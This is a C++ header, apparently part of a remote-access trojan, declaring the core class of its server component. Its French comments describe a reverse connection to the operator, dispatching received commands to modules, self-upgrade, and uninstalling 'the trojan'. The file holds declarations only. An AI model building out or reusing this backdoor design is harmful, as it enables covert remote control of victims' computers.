#ifndef INHIBITIONCORE_H
#define INHIBITIONCORE_H

#include <string>
#include <blaspheme/protocol/ConnectionInfo.hpp>
#include <common/Singleton.hpp>

namespace Inhibition
{
    class InhibitionCoreImpl;
    
    class InhibitionCore : public Common::Singleton<InhibitionCore>
    {
        public:
            InhibitionCore();
            ~InhibitionCore();
            
            // essaie de se connecter au client en mode reverse connection
            // renvoie true si la connexion a reussie, false sinon.
            bool connect();
            bool acquire_stream();
            // une fois connecte, le client va envoyer des commandes, cette
            // fonction permettra le traitement de la commande en dispatchant
            // vers les differents modules, renvoi false si il n'y plus de
            // commande a traiter
            bool process_command();
            // positionne le flag permettant de libérer la mémoire utilisée par
            // les modules
            bool exit();
            // se deconnecte du client
            void disconnect();
            // desinstaller le trojan du systeme
            bool uninstall();
            // mise a jour du serveur
            void upgrade();
            // recupere le chemin de l'executable
            const std::string& getInstallPath();
            // recupere les informations de connexions
            void set_connection_infos(const Blaspheme::ConnectionInfo& info);
            
        private:
            
            InhibitionCoreImpl * core;
    };

} /* Inhibition */

#endif // INHIBITIONCORE_H
